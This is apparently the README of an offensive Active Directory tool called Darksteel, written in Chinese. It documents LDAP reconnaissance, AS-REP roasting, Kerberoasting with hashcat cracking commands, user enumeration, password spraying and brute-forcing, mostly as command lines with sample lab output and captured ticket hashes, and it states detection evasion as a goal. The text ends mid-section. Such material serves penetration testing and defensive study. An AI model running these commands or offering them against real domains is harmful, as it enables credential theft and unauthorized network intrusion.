# Darksteel

中文 | [English](README_EN.md)

# 介绍
Darksteel是一款域内自动化信息搜集并利用的工具。在渗透时发现单独搜集域内信息比较繁琐，漏洞利用也需要很多工具，所以完成此项目，帮助我解决域内信息搜集繁琐问题以及漏洞利用问题。此项目以规避检测为主要目的完成，直接对域控进行攻击的利用没有做，因为如果有设备会产生大量的告警，后续可能会添加bypass检测的利用。
### 新功能演示
```
darksteel.exe computerip -domain test.com -dc 192.168.1.1 -user user -pass password(hash)

 ____    ______  ____    __  __   ____    ______  ____    ____    __       
/\  _`\ /\  _  \/\  _`\ /\ \/\ \ /\  _`\ /\__  _\/\  _`\ /\  _`\ /\ \      
\ \ \/\ \ \ \L\ \ \ \L\ \ \ \/'/'\ \,\L\_\/_/\ \/\ \ \L\_\ \ \L\_\ \ \    
 \ \ \ \ \ \  __ \ \ ,  /\ \ , <  \/_\__ \  \ \ \ \ \  _\L\ \  _\L\ \ \  _
  \ \ \_\ \ \ \/\ \ \ \\ \\ \ \\`\  /\ \L\ \ \ \ \ \ \ \L\ \ \ \L\ \ \ \L\ \ 
   \ \____/\ \_\ \_\ \_\ \_\ \_\ \_\\ `\____\ \ \_\ \ \____/\ \____/\ \____/  
    \/___/  \/_/\/_/\/_/\/ /\/_/\/_/ \/_____/  \/_/  \/___/  \/___/  \/___/   

   v1.0.6

[*] Computer correspondence iP:
        WIN-KQHTFQSIJSH  ————> A: 192.168.1.1
        DESKTOP-A58D722  ————> A: 192.168.1.1
        DESKTOP-DO1D913  ————> A: 192.168.1.1
        WIN-9UI852PL  ————> A: 192.168.1.1
        EXCHANGESERVER  ————> A: 192.168.1.1
```
### 项目主要功能

```
ldap
当我们拥有一个域内账号密码(hash)，可以通过ldap进行搜集域内有用信息，如spn、委派、存活计算机等等信息，为域渗透进行准备

kerberos
针对kerberos漏洞进行利用

blast
爆破域用户

computerip
批量查询域内计算机对应的ip
```

```
 ____    ______  ____    __  __   ____    ______  ____    ____    __       
/\  _`\ /\  _  \/\  _`\ /\ \/\ \ /\  _`\ /\__  _\/\  _`\ /\  _`\ /\ \      
\ \ \/\ \ \ \L\ \ \ \L\ \ \ \/'/'\ \,\L\_\/_/\ \/\ \ \L\_\ \ \L\_\ \ \    
 \ \ \ \ \ \  __ \ \ ,  /\ \ , <  \/_\__ \  \ \ \ \ \  _\L\ \  _\L\ \ \  _
  \ \ \_\ \ \ \/\ \ \ \\ \\ \ \\`\  /\ \L\ \ \ \ \ \ \ \L\ \ \ \L\ \ \ \L\ \ 
   \ \____/\ \_\ \_\ \_\ \_\ \_\ \_\\ `\____\ \ \_\ \ \____/\ \____/\ \____/  
    \/___/  \/_/\/_/\/_/\/ /\/_/\/_/ \/_____/  \/_/  \/___/  \/___/  \/___/   

   v1.0.6

Available Commands:
  darksteel ldap [parameter]
  darksteel kerberos [parameter]
  darksteel blast [parameter]
  darksteel computerip [parameter]

ldap Interact with LDAP server
  -all
        Query all content
  -dc string
        * Please enter the IP of the domain control
  -domain string
        * Please enter the domain name
  -f string
        Customize the field of LDAP
  -fuzz string
        vague query content
  -ldapSizeLimit int
        Query LDAP maximum number (default 0)
  -m string
        user 
          Query all users in the domain 
        computer 
          Query all computers in the domain 
        scomputer 
          Query survival computer 
        dc 
          Query all domain controls in the domain 
        spn 
          Query all SPN in the domain 
        ou 
          All OU in the query domain 
        mssql 
          Query all mssql services in the domain 
        asreproast 
          Query users in the domain who can use as-rep roast 
        maq 
          Query the value of maq in the domain
        admins 
          Query domain admins
        enterprise 
          Query enterprise admins
        exchangecomputer 
          Query exchange computers
        exchangesystem 
          Query Exchange Trusted Subsystem
        exchangeorgmanager 
          Query Exchange Organization Management
        trustdomain 
          Query Trust Domain
        adminsdholder 
          Query the user whose permission is set for AdminSDHolder
        sidhistory 
          Query the users who have set SIDHistory
        cacomputer 
          Query adcs
        esc1 
          Template that is threatened by esc1
        esc2 
          Template that is threatened by esc2
        computerip 
          Query the ip address of the computer in the domain
  -n string
        The field to query, you can write multiple
  -o string
        Output file position, default current directory
  -pass string
        * The corresponding password or hash user
  -user string
        * Username in the domain
  -w string
        all 
          all delegate information 
        uw 
          unconstrained delegation information 
        cw 
          Constraint appointment information 
        bw 
          Resource-based constraint delegation

kerberos Do some Kerberos stuff
  -dc string
        * Please enter the IP of the domain control
  -domain string
        * Please enter the domain name
  -enctype string
        enctype Encryption type: rc4, aes128 or aes256 (default "rc4")
  -format string
        format Output hash as John the Ripper or Hashcat format (default "hashcat")
  -ldapsizelimit int
        Query LDAP maximum number (default 0)
  -m string
        asreproast 
          as-rep roast attack
        kerberoast 
          kerberoasting attack
  -o string
        Output file position, default current directory
  -pass string
        * The corresponding password or hash user
  -ticket string
        Using ticket authentication, enter the path of the ticket
  -tuser string
        Enter the user to be utilized
  -user string
        * Username in the domain

blast Blasting Domain User
  -dc string
        * Please enter the IP of the domain control
  -domain string
        * Please enter the domain name
  -m string
        userenum -userfile user.txt
          User enumeration
        passspray -userfile user.txt -pass password
          Password spraying
        blastpass -user username -passfile password.txt
          Single user burst password
        userpass -upfile userpass.txt
          User password combinations explode
  -o string
        Output file position, default current directory
  -pass string
        Password in the domain
  -passfile string
        Password dictionary
  -t int
        Number of burst threads (default 20)
  -upfile string
        The dictionary corresponding to the user name and password is split by:
  -user string
        Username in the domain
  -userfile string
        User dictionary
  -v    Whether a failure message is displayed

computerip Query the ip address of the computer in the domain
  -dc string
        * Please enter the IP of the domain control
  -domain string
        * Please enter the domain name
  -ldapSizeLimit int
        Query LDAP maximum number (default 0)
  -o string
        Output file position, default current directory
  -pass string
        * Password in the domain
  -user string
        * Username in the domain

```
# 使用实例
## Ldap
##### 1、当我们拥有一个域内账号密码(hash)，可以通过ldap进行搜集域内有用信息，如spn、委派、存活计算机等等信息，为域渗透进行准备
```
darksteel.exe ldap -domain test.com -dc 192.168.1.1 -user user -pass password(hash) -all
 ____    ______  ____    __  __   ____    ______  ____    ____    __       
/\  _`\ /\  _  \/\  _`\ /\ \/\ \ /\  _`\ /\__  _\/\  _`\ /\  _`\ /\ \      
\ \ \/\ \ \ \L\ \ \ \L\ \ \ \/'/'\ \,\L\_\/_/\ \/\ \ \L\_\ \ \L\_\ \ \    
 \ \ \ \ \ \  __ \ \ ,  /\ \ , <  \/_\__ \  \ \ \ \ \  _\L\ \  _\L\ \ \  _
  \ \ \_\ \ \ \/\ \ \ \\ \\ \ \\`\  /\ \L\ \ \ \ \ \ \ \L\ \ \ \L\ \ \ \L\ \ 
   \ \____/\ \_\ \_\ \_\ \_\ \_\ \_\\ `\____\ \ \_\ \ \____/\ \____/\ \____/  
    \/___/  \/_/\/_/\/_/\/ /\/_/\/_/ \/_____/  \/_/  \/___/  \/___/  \/___/   
    
   v1.0.2


[*] Domain User:
        Administrator
        Guest
        WIN-KQH5FQSIJSH$
        krbtgt
        DESKTOP-AO8D722$
        DESKTOP-DO7D913$
        zz
        xx
        WIN-7UI852PL$

[*] OU :
        Domain Controllers

[*] MsSql Computer:
        WIN-7UI852PL

[*] Maq Number:
        10

[*] DC Computer:
        WIN-KQH5FQSIJSH

[*] Domain Computers:
        WIN-KQH5FQSIJSH
        DESKTOP-AO8D722
        DESKTOP-DO7D913
        WIN-7UI852PL

[*] Survival Computer:
        WIN-KQH5FQSIJSH --> Windows Server 2012 R2 Standard
        DESKTOP-AO8D722 --> Windows 10 专业版
        DESKTOP-DO7D913 --> Windows 10 专业版
        WIN-7UI852PL --> Windows Server 2008 R2 Enterprise

[*] Asreproast User:
        zz

[*] 非约束委派机器：
        CN=WIN-KQH5FQSIJSH,OU=Domain Controllers,DC=test,DC=com [WIN-KQH5FQSIJSH]
[*] 非约束委派用户：
        CN=zz,CN=Users,DC=test,DC=com [zz]
[*] 约束委派机器：
[*] 约束委派用户：
        CN=xx,CN=Users,DC=test,DC=com [xx]
        cifs/WIN-KQH5FQSIJSH.test.com/test.com
        cifs/WIN-KQH5FQSIJSH.test.com
        cifs/WIN-KQH5FQSIJSH
        cifs/WIN-KQH5FQSIJSH.test.com/test
        cifs/WIN-KQH5FQSIJSH/test
[*] 基于资源约束委派：
        CN=DESKTOP-AO8D722,CN=Computers,DC=test,DC=com -> creator  S-1-5-21-3163795713-59934753-1752793692-1106[zz]
        CN=DESKTOP-DO7D913,CN=Computers,DC=test,DC=com -> creator  S-1-5-21-3163795713-59934753-1752793692-1106[zz]
        CN=WIN-7UI852PL,CN=Computers,DC=test,DC=com -> creator  S-1-5-21-3163795713-59934753-1752793692-1106[zz]

[*] SPN：CN=xx,CN=Users,DC=test,DC=com
        cifs/admin

[*] SPN：CN=WIN-KQH5FQSIJSH,OU=Domain Controllers,DC=test,DC=com
        Dfsr-12F9A27C-BF97-4787-9364-D31B6C55EB04/WIN-KQH5FQSIJSH.test.com
        ldap/WIN-KQH5FQSIJSH.test.com/ForestDnsZones.test.com
        ldap/WIN-KQH5FQSIJSH.test.com/DomainDnsZones.test.com
        TERMSRV/WIN-KQH5FQSIJSH
        TERMSRV/WIN-KQH5FQSIJSH.test.com
        DNS/WIN-KQH5FQSIJSH.test.com
        GC/WIN-KQH5FQSIJSH.test.com/test.com
        RestrictedKrbHost/WIN-KQH5FQSIJSH.test.com
        RestrictedKrbHost/WIN-KQH5FQSIJSH
        RPC/f20db9b6-b740-4670-ab3c-ead6acf58f4f._msdcs.test.com
        HOST/WIN-KQH5FQSIJSH/test
        HOST/WIN-KQH5FQSIJSH.test.com/test
        HOST/WIN-KQH5FQSIJSH
        HOST/WIN-KQH5FQSIJSH.test.com
        HOST/WIN-KQH5FQSIJSH.test.com/test.com
        E3514235-4B06-11D1-AB04-00C04FC2DCD2/f20db9b6-b740-4670-ab3c-ead6acf58f4f/test.com
        ldap/WIN-KQH5FQSIJSH/test
        ldap/f20db9b6-b740-4670-ab3c-ead6acf58f4f._msdcs.test.com
        ldap/WIN-KQH5FQSIJSH.test.com/test
        ldap/WIN-KQH5FQSIJSH
        ldap/WIN-KQH5FQSIJSH.test.com
        ldap/WIN-KQH5FQSIJSH.test.com/test.com

[*] SPN：CN=DESKTOP-AO8D722,CN=Computers,DC=test,DC=com
        TERMSRV/DESKTOP-AO8D722
        TERMSRV/DESKTOP-AO8D722.test.com
        RestrictedKrbHost/DESKTOP-AO8D722
        HOST/DESKTOP-AO8D722
        RestrictedKrbHost/DESKTOP-AO8D722.test.com
        HOST/DESKTOP-AO8D722.test.com

[*] SPN：CN=DESKTOP-DO7D913,CN=Computers,DC=test,DC=com
        TERMSRV/DESKTOP-DO7D913
        TERMSRV/DESKTOP-DO7D913.test.com
        RestrictedKrbHost/DESKTOP-DO7D913
        HOST/DESKTOP-DO7D913
        RestrictedKrbHost/DESKTOP-DO7D913.test.com
        HOST/DESKTOP-DO7D913.test.com

[*] SPN：CN=WIN-7UI852PL,CN=Computers,DC=test,DC=com
        WSMAN/WIN-7UI852PL
        WSMAN/WIN-7UI852PL.test.com
        TERMSRV/WIN-7UI852PL
        TERMSRV/WIN-7UI852PL.test.com
        MSSQLSvc/WIN-7UI852PL.test.com:1433
        MSSQLSvc/WIN-7UI852PL.test.com
        RestrictedKrbHost/WIN-7UI852PL
        HOST/WIN-7UI852PL
        RestrictedKrbHost/WIN-7UI852PL.test.com
        HOST/WIN-7UI852PL.test.com

[*] SPN：CN=krbtgt,CN=Users,DC=test,DC=com
        kadmin/changepw

[*] SPN：CN=zz,CN=Users,DC=test,DC=com
        mssql/DESKTOP-AO8D722
```

##### 2、当我们想要查找域内某些关键字对应的user或者computer时可以使用关键字查询，来找到哪些是管理员user和管理员computer
```
darksteel.exe ldap -domain test.com -dc 192.168.1.1 -user user -pass password(hash) -fuzz 管理员
 ____    ______  ____    __  __   ____    ______  ____    ____    __       
/\  _`\ /\  _  \/\  _`\ /\ \/\ \ /\  _`\ /\__  _\/\  _`\ /\  _`\ /\ \      
\ \ \/\ \ \ \L\ \ \ \L\ \ \ \/'/'\ \,\L\_\/_/\ \/\ \ \L\_\ \ \L\_\ \ \    
 \ \ \ \ \ \  __ \ \ ,  /\ \ , <  \/_\__ \  \ \ \ \ \  _\L\ \  _\L\ \ \  _
  \ \ \_\ \ \ \/\ \ \ \\ \\ \ \\`\  /\ \L\ \ \ \ \ \ \ \L\ \ \ \L\ \ \ \L\ \ 
   \ \____/\ \_\ \_\ \_\ \_\ \_\ \_\\ `\____\ \ \_\ \ \____/\ \____/\ \____/  
    \/___/  \/_/\/_/\/_/\/ /\/_/\/_/ \/_____/  \/_/  \/___/  \/___/  \/___/   
    
   v1.0.2

[*] CN=Administrators,CN=Builtin,DC=test,DC=com   --> 管理员对计算机/域有不受限制的完全访问权
[*] CN=Schema Admins,CN=Users,DC=test,DC=com   --> 架构的指定系统管理员
[*] CN=Enterprise Admins,CN=Users,DC=test,DC=com   --> 企业的指定系统管理员
[*] CN=Domain Admins,CN=Users,DC=test,DC=com   --> 指定的域管理员
[*] CN=zz,CN=Users,DC=test,DC=com   --> 假管理员
```

##### 3、如果想查询的内容工具内没有写到也可以使用ldap语法进行查询
```
darksteel.exe ldap -domain test.com -dc 192.168.1.1 -user user -pass password(hash) -f "(objectClass=Computer)" -n cn,dNSHostName
 ____    ______  ____    __  __   ____    ______  ____    ____    __       
/\  _`\ /\  _  \/\  _`\ /\ \/\ \ /\  _`\ /\__  _\/\  _`\ /\  _`\ /\ \      
\ \ \/\ \ \ \L\ \ \ \L\ \ \ \/'/'\ \,\L\_\/_/\ \/\ \ \L\_\ \ \L\_\ \ \    
 \ \ \ \ \ \  __ \ \ ,  /\ \ , <  \/_\__ \  \ \ \ \ \  _\L\ \  _\L\ \ \  _
  \ \ \_\ \ \ \/\ \ \ \\ \\ \ \\`\  /\ \L\ \ \ \ \ \ \ \L\ \ \ \L\ \ \ \L\ \ 
   \ \____/\ \_\ \_\ \_\ \_\ \_\ \_\\ `\____\ \ \_\ \ \____/\ \____/\ \____/  
    \/___/  \/_/\/_/\/_/\/ /\/_/\/_/ \/_____/  \/_/  \/___/  \/___/  \/___/   
    
   v1.0.2

DN: CN=WIN-KQH5FQSIJSH,OU=Domain Controllers,DC=test,DC=com
cn: [WIN-KQH5FQSIJSH]
dNSHostName: [WIN-KQH5FQSIJSH.test.com]
DN: CN=DESKTOP-AO8D722,CN=Computers,DC=test,DC=com
cn: [DESKTOP-AO8D722]
dNSHostName: [DESKTOP-AO8D722.test.com]
DN: CN=DESKTOP-DO7D913,CN=Computers,DC=test,DC=com
cn: [DESKTOP-DO7D913]
dNSHostName: [DESKTOP-DO7D913.test.com]
DN: CN=WIN-7UI852PL,CN=Computers,DC=test,DC=com
cn: [WIN-7UI852PL]
dNSHostName: [WIN-7UI852PL.test.com]
```
## Kerberos

##### 1、利用kerberos不需要域认证对用户密钥进行获取，可选择输出hashcat或john爆破格式（默认为hashcat）爆破出来的密码则为该用户的密码，如果不指定目标用户则需要一个域用户账号密码进行ldap查询并输出所有可利用密钥。hashcat爆破命令：hashcat -m 18200 hash.txt pass.txt --force

```
darksteel.exe kerberos -m asreproast -dc 192.168.1.1 -domain test.com -user user -pass password(hash)
 ____    ______  ____    __  __   ____    ______  ____    ____    __       
/\  _`\ /\  _  \/\  _`\ /\ \/\ \ /\  _`\ /\__  _\/\  _`\ /\  _`\ /\ \      
\ \ \/\ \ \ \L\ \ \ \L\ \ \ \/'/'\ \,\L\_\/_/\ \/\ \ \L\_\ \ \L\_\ \ \    
 \ \ \ \ \ \  __ \ \ ,  /\ \ , <  \/_\__ \  \ \ \ \ \  _\L\ \  _\L\ \ \  _
  \ \ \_\ \ \ \/\ \ \ \\ \\ \ \\`\  /\ \L\ \ \ \ \ \ \ \L\ \ \ \L\ \ \ \L\ \ 
   \ \____/\ \_\ \_\ \_\ \_\ \_\ \_\\ `\____\ \ \_\ \ \____/\ \____/\ \____/  
    \/___/  \/_/\/_/\/_/\/ /\/_/\/_/ \/_____/  \/_/  \/___/  \/___/  \/___/   
    
   v1.0.2

[*] Target domain: test.com (192.168.1.1)
[*] Use LDAP to retreive vulnerable accounts
[*] Ask AS-Rep for user zz without pre-authentication
[*] Get a valid ticket with encryption: arcfour-hmac-md5
[*] Hashes:
$krb5asrep$23$zz@test.COM:8193197b866da1209af56fd5f4610c38$bc8ee9135bd82f0b2333
af24ae376bb014cd0400ef9b8ff0d0dbc8180c671cc6fe1290cd2c876f84352126bd7948adbc6b3f
51d85ebe1e8dfa15c53443fb835d743ce3cd3e5ac7f2549271385134bc685ffe55bdb30103cf132a
69267d9cec9201f478547892b3343c7427b83a901f6c01d877a4357d14d0384cd8b3cf2940e6e32e
a862d700499c6a7791e4fd17228a9adc5db5ebbe6e69d59bcde7f7e3fd3751ba54eda6339cb87b69
5a7a5daf5964a0e626129e8acc9b783aed7c060a4044d41f02da52bcff466a32dc465de10cc7e90c
7c5b84fcac701107da4300db4cfc36d58cc0524f23b5e16789656

```

##### 2、指定目标用户，则不需要域用户认证

```
darksteel.exe kerberos  -m asreproast -dc 192.168.1.1 -domain test.com -tuser zz
 ____    ______  ____    __  __   ____    ______  ____    ____    __       
/\  _`\ /\  _  \/\  _`\ /\ \/\ \ /\  _`\ /\__  _\/\  _`\ /\  _`\ /\ \      
\ \ \/\ \ \ \L\ \ \ \L\ \ \ \/'/'\ \,\L\_\/_/\ \/\ \ \L\_\ \ \L\_\ \ \    
 \ \ \ \ \ \  __ \ \ ,  /\ \ , <  \/_\__ \  \ \ \ \ \  _\L\ \  _\L\ \ \  _
  \ \ \_\ \ \ \/\ \ \ \\ \\ \ \\`\  /\ \L\ \ \ \ \ \ \ \L\ \ \ \L\ \ \ \L\ \ 
   \ \____/\ \_\ \_\ \_\ \_\ \_\ \_\\ `\____\ \ \_\ \ \____/\ \____/\ \____/  
    \/___/  \/_/\/_/\/_/\/ /\/_/\/_/ \/_____/  \/_/  \/___/  \/___/  \/___/   
    
   v1.0.2

[*] Target domain: test.com (192.168.1.1)
[*] Ask AS-Rep for user zz without pre-authentication
[*] Get a valid ticket with encryption: arcfour-hmac-md5
[*] Hashes:
$krb5asrep$23$zz@test.COM:8193197b866da1209af56fd5f4610c38$bc8ee9135bd82f0b2333
af24ae376bb014cd0400ef9b8ff0d0dbc8180c671cc6fe1290cd2c876f84352126bd7948adbc6b3f
51d85ebe1e8dfa15c53443fb835d743ce3cd3e5ac7f2549271385134bc685ffe55bdb30103cf132a
69267d9cec9201f478547892b3343c7427b83a901f6c01d877a4357d14d0384cd8b3cf2940e6e32e
a862d700499c6a7791e4fd17228a9adc5db5ebbe6e69d59bcde7f7e3fd3751ba54eda6339cb87b69
5a7a5daf5964a0e626129e8acc9b783aed7c060a4044d41f02da52bcff466a32dc465de10cc7e90c
7c5b84fcac701107da4300db4cfc36d58cc0524f23b5e16789656
```

##### 3、如果目标将用户设置了spn后，则可以将密钥输出，可选择输出hashcat或john爆破格式（默认为hashcat）爆破出来的密码则为该用户的密码，如果不指定目标用户则需要一个域用户账号密码进行ldap查询并输出所有可利用密钥。hashcat爆破命令：hashcat -m 13100 hash.txt pass.txt --force

```
darksteel.exe kerberos -m kerberoast -dc 192.168.1.1 -domain test.com -user user -pass password(hash) 
 ____    ______  ____    __  __   ____    ______  ____    ____    __       
/\  _`\ /\  _  \/\  _`\ /\ \/\ \ /\  _`\ /\__  _\/\  _`\ /\  _`\ /\ \      
\ \ \/\ \ \ \L\ \ \ \L\ \ \ \/'/'\ \,\L\_\/_/\ \/\ \ \L\_\ \ \L\_\ \ \    
 \ \ \ \ \ \  __ \ \ ,  /\ \ , <  \/_\__ \  \ \ \ \ \  _\L\ \  _\L\ \ \  _
  \ \ \_\ \ \ \/\ \ \ \\ \\ \ \\`\  /\ \L\ \ \ \ \ \ \ \L\ \ \ \L\ \ \ \L\ \ 
   \ \____/\ \_\ \_\ \_\ \_\ \_\ \_\\ `\____\ \ \_\ \ \____/\ \____/\ \____/  
    \/___/  \/_/\/_/\/_/\/ /\/_/\/_/ \/_____/  \/_/  \/___/  \/___/  \/___/   
    
   v1.0.2


[*] Target domain: test.com (192.168.1.1)
[*] Use username and password/key as credentials to request a TGT
[*] Use LDAP to retreive vulnerable accounts
[*] Found 1 users to Kerberoast found in LDAP
[*] CN=zz,CN=Users,DC=test,DC=com
    sAMAccountName      : zz
    distinguishedName   : CN=zz,CN=Users,DC=test,DC=com
    servicePrincipalName: mssql/DESKTOP-AO8D722
[*] Asking TGS for principal: zz
[*] Hashes:
$krb5tgs$23$*zz$WANLIU1.COM$zz*$c1c2da2dbd793dbe2f627132f992e3a7$a3f77d350104545
3a8ab2917a0961d3ca54f4e97610d00ee5cb3ac03dbc84a9831d4bbd007d143619de8ca277e36c97
7f5e672396750350a14916b5dece2daa279e47f7684b03d044e9e748f5f3ce777efe73e4df64d814
75dd1217784fe78fabe7195f5dc659520081152c045574200bfe68aad97cc6c529c3d6e57eefbbaa
f270fdcee23445ce160b4c71346753fd8464aa5e6073b8b0c9d6e3865a4f48dc61d05f9a97a4d0a5
6caf0ad0059e058e4746e260d2905e429e31ed7655c87fghtf5654f54c9e506d3b737f678f9fd2bd
68c226e61f852a6c1e35ceb3b1f6f3c78f1160ddb4ea290870eff55f4ba6ca0161a5bf5545a8da59
fe20610aafa91fbbe7b8e8f3ff715f965bd09681aa41b929f98a94f8084fca1cb98f38e718612f1e
51d779c622ae91e0ee62bd2a809b59e0031f57c2647b8ef15972015f3669a80d489139153d20312b
c8f9be5252fc6ed6dd78a22dec9458d41e6a940534d33c8ajhhgj5f36d224332fec721874e46fea7
b2397922c6cbe689ef0ff7d0cb1c9d89c975c462a746ae5d473b9cfc37fadcecc96a3907980a13b9
28cd053467090458ab0a8995e1237cef641698172d6537c2ef4e5987726d6a007b03ffec867f3ab8
5fd1ce7e89f6bc694266c61ca74e6af2200bfa3a90313bbda3282ed267e6f59d477e789e4c454f66
ac942df4461fc2bad317e23176e8cc299261c1c947dca068153b2fab47b018b2e82ba08d20078195
8149dd3b03c27ec17bee22496c7cccb3e6acd23c6e7bce62658f7274ce3eef06aa16d4c94bbfbe42
3f9e7b7254625d28c27fbf2bc07aeec63f7ebe25b49742346eea44e61478e212d719be9c98a53a1c
2657790c02654fa1c9caf5bdbb816cece4e6ce6e48c86323a8596f059b9d4e4856d52480f56272a5
a393473eaf0ab12b3e085aa97ee28311c4cd54797229522001a3e5fd5fdefgrg4e03efe691635448
392ea8275cb0916bcc205fb2376ae60008a24cdea072069ca4710d9290d77bab830cf96c97c31fb0
bab707802409efbad0bb30c6efe207c75632225a52ec757f878e8d97647c34d6703e2a94f2701739
9ba6efd18a4f714b63468810929287ca3359fff00632ab5de545667d39d6e77456c1b7df57d400a7
ec9ad23b0fc93f24f9c151d9509aeabfbb298a02865bd5d16a273fc6ffb8df14456e0b2eaf973653
895e7f51f73606294845d6a9ccab6a68b5774a706f06a692c4b619e50ac35fa48e1aadb6323c279f
68e4c6d29462bd82371a0f24744cbb43bf4ca3a6cca165fe4b4025a4b69a2208bd16eacb0a029973
86bff57b4fa0924713d7b32295096ac7cc7942299a0b5126880c768edcb7743a429ded7323941cdd
c6293d7962553c7423b465d9c1c9aae98cf14e30ff0f21e8d75275a48dc1fac5bb37987057e74f83
f7aeb47dc601826d6643f95c33c7d388a3120b08ed2864e0c0bdacfb41594cea5d286583ed2fd520
89857642a160760dca1cea4
```
## blast
##### 1、当我们找到域但还没有域用户的时候可以使用域用户枚举进行枚举域用户。想要输出失败信息可以使用-v参数

```
darksteel.exe blast -m userenum -dc 192.168.1.1 -domain test.com -userfile users.txt
 ____    ______  ____    __  __   ____    ______  ____    ____    __       
/\  _`\ /\  _  \/\  _`\ /\ \/\ \ /\  _`\ /\__  _\/\  _`\ /\  _`\ /\ \      
\ \ \/\ \ \ \L\ \ \ \L\ \ \ \/'/'\ \,\L\_\/_/\ \/\ \ \L\_\ \ \L\_\ \ \    
 \ \ \ \ \ \  __ \ \ ,  /\ \ , <  \/_\__ \  \ \ \ \ \  _\L\ \  _\L\ \ \  _
  \ \ \_\ \ \ \/\ \ \ \\ \\ \ \\`\  /\ \L\ \ \ \ \ \ \ \L\ \ \ \L\ \ \ \L\ \ 
   \ \____/\ \_\ \_\ \_\ \_\ \_\ \_\\ `\____\ \ \_\ \ \____/\ \____/\ \____/  
    \/___/  \/_/\/_/\/_/\/ /\/_/\/_/ \/_____/  \/_/  \/___/  \/___/  \/___/   
    
   v1.0.2


[+] USERNAME:    zz@test.com
[+] USERNAME:    xx@test.com
Done! Tested logins in 0.034 seconds



darksteel.exe blast -m userenum -dc 192.168.1.1 -domain test.com -userfile users.txt -v
 ____    ______  ____    __  __   ____    ______  ____    ____    __       
/\  _`\ /\  _  \/\  _`\ /\ \/\ \ /\  _`\ /\__  _\/\  _`\ /\  _`\ /\ \      
\ \ \/\ \ \ \L\ \ \ \L\ \ \ \/'/'\ \,\L\_\/_/\ \/\ \ \L\_\ \ \L\_\ \ \    
 \ \ \ \ \ \  __ \ \ ,  /\ \ , <  \/_\__ \  \ \ \ \ \  _\L\ \  _\L\ \ \  _
  \ \ \_\ \ \ \/\ \ \ \\ \\ \ \\`\  /\ \L\ \ \ \ \ \ \ \L\ \ \ \L\ \ \ \L\ \ 
   \ \____/\ \_\ \_\ \_\ \_\ \_\ \_\\ `\____\ \ \_\ \ \____/\ \____/\ \____/  
    \/___/  \/_/\/_/\/_/\/ /\/_/\/_/ \/_____/  \/_/  \/___/  \/___/  \/___/   
    
   v1.0.2


[!] asdfqwadad@test.com - User does not exist
[!] admin@test.com - User does not exist
[+] USERNAME:    zz@test.com
[+] USERNAME:    xx@test.com
Done! Tested logins in 0.002 seconds
```

##### 2、找到用户后使用单个密码进行爆破
```
darksteel.exe blast -m passspray -dc 192.168.1.1 -domain test.com -userfile users.txt -pass 123456
 ____    ______  ____    __  __   ____    ______  ____    ____    __       
/\  _`\ /\  _  \/\  _`\ /\ \/\ \ /\  _`\ /\__  _\/\  _`\ /\  _`\ /\ \      
\ \ \/\ \ \ \L\ \ \ \L\ \ \ \/'/'\ \,\L\_\/_/\ \/\ \ \L\_\ \ \L\_\ \ \    
 \ \ \ \ \ \  __ \ \ ,  /\ \ , <  \/_\__ \  \ \ \ \ \  _\L\ \  _\L\ \ \  _
  \ \ \_\ \ \ \/\ \ \ \\ \\ \ \\`\  /\ \L\ \ \ \ \ \ \ \L\ \ \ \L\ \ \ \L\ \ 
   \ \____/\ \_\ \_\ \_\ \_\ \_\ \_\\ `\____\ \ \_\ \ \____/\ \____/\ \____/  
    \/___/  \/_/\/_/\/_/\/ /\/_/\/_/ \/_____/  \/_/  \/___/  \/___/  \/___/   
    
   v1.0.2


[+] SUCCESS:     zz@test.com:123456
Done! Tested logins in 0.024 seconds
```

##### 3、使用密码字典爆破单个用户

```
darksteel.exe blast -m blastpass -dc 192.168.1.1 -domain test.com -user zz -passfile pass.txt
 ____    ______  ____    __  __   ____    ______  ____    ____    __       
/\  _`\ /\  _  \/\  _`\ /\ \/\ \ /\  _`\ /\__  _\/\  _`\ /\  _`\ /\ \      
\ \ \/\ \ \ \L\ \ \ \L\ \ \ \/'/'\ \,\L\_\/_/\ \/\ \ \L\_\ \ \L\_\ \ \    
 \ \ \ \ \ \  __ \ \ ,  /\ \ , <  \/_\__ \  \ \ \ \ \  _\L\ \  _\L\ \ \  _
  \ \ \_\ \ \ \/\ \ \ \\ \\ \ \\`\  /\ \L\ \ \ \ \ \ \ \L\ \ \ \L\ \ \ \L\ \ 
   \ \____/\ \_\ \_\ \_\ \_\ \_\ \_\\ `\____\ \ \_\ \ \____/\ \____/\ \____/  
    \/___/  \/_/\/_/\/_/\/ /\/_/\/_/ \/_____/  \/_/  \/___/  \/___/  \/___/   
    
   v1.0.2


[+] SUCCESS:     zz@test.com:123456
Done! Tested logins in 0.013 seconds
```

##### 4、使用用户名密码对应字典爆破

```
darksteel.exe blast -m userpass -dc 192.168.1.1 -test.com -upfile userpass.txt
 ____    ______  ____    __  __   ____    ______  ____    ____    __       
/\  _`\ /\  _  \/\  _`\ /\ \/\ \ /\  _`\ /\__  _\/\  _`\ /\  _`\ /\ \      
\ \ \/\ \ \ \L\ \ \ \L\ \ \ \/'/'\ \,\L\_\/_/\ \/\ \ \L\_\ \ \L\_\ \ \    
 \ \ \ \ \ \  __ \ \ ,  /\ \ , <  \/_\__ \  \ \ \ \ \  _\L\ \  _\L\ \ \  _
  \ \ \_\ \ \ \/\ \ \ \\ \\ \ \\`\  /\ \L\ \ \ \ \ \ \ \L\ \ \ \L\ \ \ \L\ \ 
   \ \____/\ \_\ \_\ \_\ \_\ \_\ \_\\ `\____\ \ \_\ \ \____/\ \____/\ \____/  
    \/___/  \/_/\/_/\/_/\/ /\/_/\/_/ \/_____/  \/_/  \/___/  \/___/  \/___/   
    
   v1.0.2


[+] SUCCESS:     zz@test.com:123456
Done! Tested logins in 0.010 seconds
```

# 其他用法
## ldap

##### 支持密码为hash
```
darksteel ldap -dc 192.168.1.1 -domain test.com -user administrator -pass hash 
```

##### 查询域内单条内容 -m指定

```
darksteel ldap -dc 192.168.1.1 -domain test.com -user administrator -pass 123456 -m computer
```
##### 查询所有委派信息 -w指定

```
darksteel ldap -dc 192.168.1.1 -domain test.com -user administrator -pass 123456 -w all
```
#### 可选择参数

```
-o                  保存文件（不包括自定义查询）

-ldapsizelimit      最大查询数（默认所有）

-m                  指定单独查询内容

-w                  指定单独查询委派内容
```


## kerberos
##### kerberoasting（支持密码为hash）

##### 利用所有用户并输出

```
darksteel kerberos -dc 192.168.1.1 -domain test.com -user administrator -pass 123 -m kerberoast
```
##### 利用指定test用户并输出

```
darksteel kerberos -dc 192.168.1.1 -domain test.com -user administrator -pass 123 -m kerberoast -tuser test
```

##### 使用TGT进行认证（只可利用单用户）

```
